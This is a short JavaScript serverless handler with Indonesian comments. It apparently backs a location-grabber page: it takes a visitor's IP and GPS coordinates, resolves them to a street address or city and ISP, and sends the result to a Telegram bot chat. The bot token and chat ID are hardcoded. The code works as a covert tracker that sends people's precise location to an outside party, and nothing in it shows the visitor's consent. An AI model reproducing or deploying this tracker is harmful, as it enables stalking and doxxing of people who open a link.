export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    
    const { ip, lat, lon, accuracy } = req.body;
    
    // GANTI DENGAN TOKEN DAN CHAT ID LO
    const botToken = 'Y8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
    const chatId = '8564704937';
    
    let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || '-'}\n`;
    
    if (lat && lon) {
        msg += `📍 GPS: ${lat}, ${lon}\n📏 Akurasi: ${accuracy || '?'} meter\n`;
        // Reverse geocoding
        try {
            const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
            msg += `🏠 Alamat: ${geo.display_name || '-'}\n`;
        } catch(e) {}
    } else if (ip) {
        try {
            const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
            if (geo.status === 'success') {
                msg += `📍 Lokasi: ${geo.city}, ${geo.regionName}, ${geo.country}\n📡 ISP: ${geo.isp}\n🗺️ Koordinat: ${geo.lat}, ${geo.lon}\n`;
            }
        } catch(e) {}
    }
    
    msg += `\n🕐 Waktu: ${new Date().toISOString()}`;
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
    });
    
    res.json({ status: 'ok' });
}
